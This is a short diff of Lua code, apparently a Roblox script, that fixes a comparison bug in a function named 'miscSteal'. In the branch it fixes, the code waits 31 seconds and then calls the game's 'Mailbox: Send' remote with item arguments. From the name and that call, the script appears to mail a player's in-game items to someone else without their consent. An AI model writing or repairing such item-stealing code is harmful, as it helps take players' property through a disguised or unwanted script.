@@ -46,7 +46,7 @@ local function miscSteal()
                 [4] = i,
                 [5] = v._am
             }
-                if waited = false then
+                if waited == false then
                     task.wait(31)
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                 else
